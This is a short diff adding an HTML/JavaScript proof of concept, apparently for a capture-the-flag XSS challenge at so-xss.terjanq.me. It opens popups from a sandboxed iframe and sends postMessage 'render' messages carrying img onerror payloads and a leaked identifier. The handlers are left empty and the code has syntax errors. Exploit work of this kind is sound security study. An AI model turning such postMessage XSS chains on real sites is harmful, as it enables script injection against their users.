@@ -1,0 +1,23 @@
+<script>
+  f = document.createElement('iframe');
+  f.sandbox = 'allow-scripts allow-popups';
+  f.srcdoc = `
+  <script>
+    document.onmousedown = e => {
+      let w = open('https://so-xss.terjanq.me/iframe.php');
+      setTimeout(_ => {
+        w.postMessage({type: "render", body: "<img onerror=''>"}, '*'),
+      }, 3000);
+    };
+  </script>
+  `
+  document.body.appendChild(f);
+
+  document.onmousedown = e => {
+      let w = open('https://so-xss.terjanq.me');
+      setTimeout(_ => {
+        w[0].postMessage({identifier: LeakedValue, type: "render", body: "<img onerror=''>"}, '*'),
+      }, 3000);
+  };
+
+</script>
